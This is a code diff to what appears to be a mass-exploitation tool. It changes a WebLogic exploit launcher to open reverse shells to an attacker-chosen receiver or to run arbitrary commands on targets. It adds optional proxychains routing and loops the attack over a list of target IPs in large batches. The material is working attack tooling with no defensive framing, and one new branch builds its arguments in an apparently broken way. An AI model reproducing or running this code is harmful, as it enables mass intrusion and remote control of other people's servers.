@@ -13,6 +13,7 @@ import util.baidu as baidu
 # mark home for our way back
 init_dir = os.getcwd()
 proxy_conf = str(init_dir) + '/data/proxy.conf'
+proxy = True
 
 # default target list
 ip_list = 'data/ip_list.txt'
@@ -168,37 +169,45 @@ scanner_args = []
 
 def weblogic():
     print(colors.BLUE + '\n[*] Welcome to Weblogic exploit' + colors.END)
-    shellServer = input(
-        colors.BLUE +
-        '[?] What\'s the IP of shell receiver? ' +
-        colors.END)
-    port = input(
-        colors.BLUE +
-        '[?] What\'s the port of shell receiver? ' +
-        colors.END)
     server_port = input(
         colors.BLUE +
         '[?] What\'s the port of Weblogic server? ' +
         colors.END)
-
-    # start scanner
-    exploit = 'weblogic.py'
-    work_path = '/weblogic/'
-    exec_path = exploit
     os_type = str(
         input(
             colors.BLUE +
             '[?] Windows or Linux? [w/l] ' +
             colors.END))
-    if os_type.lower() == 'w':
-        custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
-            shellServer, port, server_port).split()
-    elif os_type.lower() == 'l':
-        custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
-            shellServer, port, server_port).split()
+    if str(input('[?] Do you need a reverse shell? [y/n] ')).strip().lower() == 'y':
+        shellServer = input(
+            colors.BLUE +
+            '[?] What\'s the IP of shell receiver? ' +
+            colors.END)
+        port = input(
+            colors.BLUE +
+            '[?] What\'s the port of shell receiver? ' +
+            colors.END)
+        if os_type.lower() == 'w':
+            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
+                shellServer, port, server_port).split()
+        elif os_type.lower() == 'l':
+            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
+                shellServer, port, server_port).split()
+        else:
+            console.print_error('[-] Invalid input')
+            return
     else:
-        console.print_error('[-] Invalid input')
-        return
+        cmd = str(input('[?] What command do you want to execute on the target? ')).strip()
+        if os_type.lower() == 'w':
+            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(server_port, cmd)
+        if os_type.lower() == 'l':
+            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(server_port, cmd)
+
+
+    # start scanner
+    exploit = 'weblogic.py'
+    work_path = '/weblogic/'
+    exec_path = exploit
     jobs = 100
     # waitTime = 25  # actually it's deprecated
     scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
@@ -241,7 +250,12 @@ def s2_045():
 
 def attack():
     global proxy_conf
+    global proxy
     global scanner_args
+    if str(input(colors.CYAN + '[?] Do you wish to use proxychains? [y/n] ' + colors.END)).strip().lower() == 'y':
+        proxy = True
+    else:
+        proxy = False
     answ = str(
         input(
             colors.DARKCYAN +
@@ -321,7 +335,6 @@ def attack():
         d = '/'
         exec_path = d.join(exec_path)
         work_path = d.join(work_path)
-        e_args = ['proxychains4', '-q', '-f', proxy_conf, './' + exec_path]
         d = ' '
         print(
             colors.BLUE +
@@ -344,18 +357,23 @@ def attack():
 
 def scanner(scanner_args):
     global ip_list
+    global proxy
     exploit, work_path, exec_path, custom_args, jobs = scanner_args[
         0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
-    e_args = [
-        'proxychains4',
-        '-q',
-        '-f',
-        proxy_conf,
-        './exploits/' +
-        work_path +
-        exec_path]
+    if proxy:
+        e_args = [
+            'proxychains4',
+            '-q',
+            '-f',
+            proxy_conf,
+            './' + exec_path]
+    else:
+        e_args = ['./' + exec_path]
+    e_args += custom_args
+    e_args += ['-t']
     f = open(init_dir + '/' + ip_list)
     os.chdir('./exploits/' + work_path)
+    console.print_warning(e_args)
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
     time.sleep(3)
     count = 0
@@ -374,17 +392,14 @@ def scanner(scanner_args):
         count += 1
         tested += 1
         try:
-            e_args += ['-t', ip]
-            e_args += custom_args
+            e_args += [ip]
+            print(e_args)
             proc = subprocess.Popen(e_args)
+
+            # continue to next target
+            e_args.remove(ip)
             time.sleep(.1)
-            e_args = [
-                'proxychains4',
-                '-q',
-                '-f',
-                proxy_conf,
-                './' +
-                exec_path]
+
             if count == jobs or count == 0:
                 count = 0
                 rnd += 1
